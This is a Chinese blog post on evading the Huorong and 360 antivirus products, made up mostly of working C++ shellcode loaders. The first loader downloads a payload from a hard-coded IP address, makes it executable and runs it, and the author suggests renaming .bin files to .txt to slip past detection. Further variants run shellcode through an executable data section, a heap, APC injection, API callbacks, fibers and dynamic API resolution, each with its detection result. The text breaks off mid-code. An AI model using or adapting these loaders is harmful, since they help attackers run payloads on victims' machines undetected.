<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250521152223304.png" alt="image-20250521152223304"></p>
<p>火绒貌似不用测了，通过近击此对火绒免杀的测试，火绒只看shellcode，只要对shellcode的加密到位，火绒就不会报毒。</p>
<p>又用360进行了测试，360免杀</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedff0ac7662708b5e475463aa967dc7c05.png" alt="ff0ac7662708b5e475463aa967dc7c05"></p>
<p><strong>网络分离 + 修改内存属性</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winhttp.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义全局缓冲区</span></span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> MAX_BUFFER_SIZE = <span class="number">1024</span> * <span class="number">400</span>; <span class="comment">// 假设最大缓冲区大小为1MB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[MAX_BUFFER_SIZE];</span><br><span class="line"><span class="type">size_t</span> bufOffset = <span class="number">0</span>; <span class="comment">// 当前缓冲区写入位置</span></span><br><span class="line"><span class="function">HINTERNET <span class="title">winhttp_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化 WinHTTP 会话</span></span><br><span class="line">    HINTERNET hSession = <span class="built_in">WinHttpOpen</span>(<span class="string">L&quot;WinHTTP Example/1.0&quot;</span>,</span><br><span class="line">        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,</span><br><span class="line">        WINHTTP_NO_PROXY_NAME,</span><br><span class="line">        WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hSession) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open WinHTTP session.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 连接到服务器</span></span><br><span class="line">    HINTERNET hConnect = <span class="built_in">WinHttpConnect</span>(hSession, <span class="string">L&quot;101.42.13.105&quot;</span>, <span class="number">80</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hConnect) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to connect to server.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建 HTTP 请求</span></span><br><span class="line">    HINTERNET hRequest = <span class="built_in">WinHttpOpenRequest</span>(hConnect, <span class="string">L&quot;GET&quot;</span>, <span class="string">L&quot;/1.txt&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hRequest) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to create HTTP request.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WinHttpSendRequest</span>(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span class="number">0</span>, WINHTTP_NO_REQUEST_DATA, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to send HTTP request.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 接收响应</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WinHttpReceiveResponse</span>(hRequest, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to receive HTTP response.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">        <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hRequest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">datacopy</span><span class="params">(HINTERNET hRequest, <span class="type">unsigned</span> <span class="type">char</span> tmpbuf[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 读取响应数据</span></span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// 检查可用数据大小</span></span><br><span class="line">        dwSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize)) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Error querying data size.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分配缓冲区</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span>* pszOutBuffer = <span class="keyword">new</span> <span class="type">unsigned</span> <span class="type">char</span>[dwSize + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (!pszOutBuffer) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Out of memory.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取数据</span></span><br><span class="line">        <span class="built_in">ZeroMemory</span>(pszOutBuffer, dwSize + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">WinHttpReadData</span>(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded)) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;Error reading data.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 确保不会超出全局缓冲区大小</span></span><br><span class="line">            <span class="keyword">if</span> (bufOffset + dwDownloaded &gt; MAX_BUFFER_SIZE) &#123;</span><br><span class="line">                std::cerr &lt;&lt; <span class="string">&quot;Global buffer overflow!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">                <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将数据写入全局缓冲区</span></span><br><span class="line">            <span class="built_in">memcpy</span>(tmpbuf + bufOffset, pszOutBuffer, dwDownloaded);</span><br><span class="line">            bufOffset += dwDownloaded;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在调试时打印已接收的数据大小</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Received &quot;</span> &lt;&lt; dwDownloaded &lt;&lt; <span class="string">&quot; bytes.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">delete</span>[] pszOutBuffer;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (dwSize &gt; <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HINTERNET hRequest = <span class="built_in">winhttp_init</span>();</span><br><span class="line">    <span class="built_in">datacopy</span>(hRequest, buf);</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">VirtualProtect</span>(buf, bufOffset, PAGE_EXECUTE_READ, &amp;oldProtect)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以过360免杀</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedundefinedimage-20250521201424619.png" alt="image-20250521201424619"></p>
<p>第二天又测试了以下火绒，发现如果请求的是<a target="_blank" rel="noopener" href="http://101.42.13.105/pd.bin%E5%B0%B1%E4%BC%9A%E6%9D%80%EF%BC%8C%E4%BD%86%E6%98%AF%E8%AF%B7%E6%B1%82.txt%E5%B0%B1%E4%B8%8D%E6%9D%80%EF%BC%8C%E9%82%A3%E4%B9%88%E5%8F%AA%E9%9C%80%E8%A6%81%E6%8A%8A.bin%E5%90%8E%E7%BC%80%E6%94%B9%E6%88%90.txt%E5%8D%B3%E5%8F%AF%E3%80%82">http://101.42.13.105/pd.bin就会杀，但是请求.txt就不杀，那么只需要把.bin后缀改成.txt即可。</a></p>
<h6 id="修改data段属性"><a href="#修改data段属性" class="headerlink" title="修改data段属性"></a>修改data段属性</h6><p>修改data段属性可以避免使用VirtualProtect这个敏感的windows api函数</p>
<p>因为全局变量默认存储在data段，那么将data段的属性设置为”可读可写可执行”即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03\x00...&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	((<span class="built_in">void</span>(*)()) &amp; buf) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒和360报毒</p>
<h6 id="新增数据段"><a href="#新增数据段" class="headerlink" title="新增数据段"></a>新增数据段</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;vdata&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03\x00...&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:vdata,RWE&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	((<span class="built_in">void</span>(*)()) &amp; buf) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒和360报毒</p>
<h6 id="堆加载"><a href="#堆加载" class="headerlink" title="堆加载"></a>堆加载</h6><p>除了修改数据段内存属性外，还可以通过HeapCreate api获取一个具有执行权限的堆，并在其中分配一块内存，并将shellcode复制到这块内存中，这样可以规避VirtualProtect、VirtualAlloc这些windows api敏感函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE heapHandle = <span class="built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">	<span class="type">char</span>* addr = (<span class="type">char</span>*)<span class="built_in">HeapAlloc</span>(heapHandle, HEAP_ZERO_MEMORY, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	<span class="built_in">memcpy</span>(addr, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">	((<span class="built_in">void</span>(*)()) addr)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒、360报毒</p>
<h5 id="APC注入运行"><a href="#APC注入运行" class="headerlink" title="APC注入运行"></a>APC注入运行</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line">	DWORD oldProject;</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProject);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取NtTestAlert的函数地址</span></span><br><span class="line">	pNtTestAlert NtTestAlert = (pNtTestAlert)(<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">QueueUserAPC</span>((PAPCFUNC)(PTHREAD_START_ROUTINE)(LPVOID)buf, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">NtTestAlert</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒过，360杀</p>
<h5 id="回调函数运行"><a href="#回调函数运行" class="headerlink" title="回调函数运行"></a>回调函数运行</h5><h6 id="EnumDateFormatsA"><a href="#EnumDateFormatsA" class="headerlink" title="EnumDateFormatsA"></a>EnumDateFormatsA</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line">	DWORD oldProject;</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProject);</span><br><span class="line">	<span class="comment">//回调函数运行</span></span><br><span class="line">	<span class="built_in">EnumDateFormatsA</span>((DATEFMT_ENUMPROCA)&amp;buf, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒过、360杀</p>
<h6 id="EnumUILanguages"><a href="#EnumUILanguages" class="headerlink" title="EnumUILanguages"></a>EnumUILanguages</h6><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line">	DWORD oldProject;</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProject);</span><br><span class="line">	<span class="comment">//回调函数运行</span></span><br><span class="line">	<span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROCW)&amp;buf, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒过、360杀</p>
<h5 id="创建纤程运行"><a href="#创建纤程运行" class="headerlink" title="创建纤程运行"></a>创建纤程运行</h5><p>纤程是一种用户级别的线程。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pNtTestAlert)</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//main函数，程序入口函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xe8\xa0\x03...&quot;</span>;</span><br><span class="line">	DWORD oldProject;</span><br><span class="line">	<span class="built_in">VirtualProtect</span>((LPVOID)buf, <span class="built_in">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;oldProject);</span><br><span class="line">	<span class="comment">//将当前线程转换为纤程</span></span><br><span class="line">	<span class="built_in">ConvertThreadToFiber</span>(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//创建一个纤程对象，shellcode为纤程入口点，使用默认大小和无标志位</span></span><br><span class="line">	<span class="type">void</span>* bufFiber = <span class="built_in">CreateFiber</span>(<span class="number">0</span>,(LPFIBER_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//切换到新创建的纤程，开始执行buf</span></span><br><span class="line">	<span class="built_in">SwitchToFiber</span>(bufFiber);</span><br><span class="line">	<span class="comment">//执行完毕后删除纤程对象</span></span><br><span class="line">	<span class="built_in">DeleteFiber</span>(bufFiber);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>火绒过、360杀</p>
<h5 id="动态api函数加载"><a href="#动态api函数加载" class="headerlink" title="动态api函数加载"></a>动态api函数加载</h5><p>不直接使用形如 VirtualAlloc 的 Windows API了，而是通过 GetProcAddress 动态获取，绕过对敏感 Windows API的检测。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  <span class="comment">//导入windows api和一些常量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) <span class="comment">//不显示黑窗口</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//VirtualAlloc</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* myVirtualAlloc)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//CreateThread</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* 